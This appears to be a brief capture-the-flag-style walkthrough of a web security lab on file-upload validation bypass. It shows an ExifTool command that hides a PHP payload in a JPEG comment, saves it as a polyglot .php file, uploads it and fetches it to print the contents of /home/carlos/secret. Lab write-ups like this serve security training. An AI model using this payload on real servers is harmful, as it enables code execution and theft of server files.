try to upload the php script
intercept the request and send it to the repeater

response -> Error: file is not a valid image Sorry, there was an error uploading your file. <-

let's try make our script file look like an image .jpg by puting our script inside an image .jpg then load it to .php file using the tool ExifTool

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

now let's upload polyglot.php
response => The file avatars/polyglot.php has been uploaded. <=

go to /files/avatars/polyglot.php

to find the data search for "START"
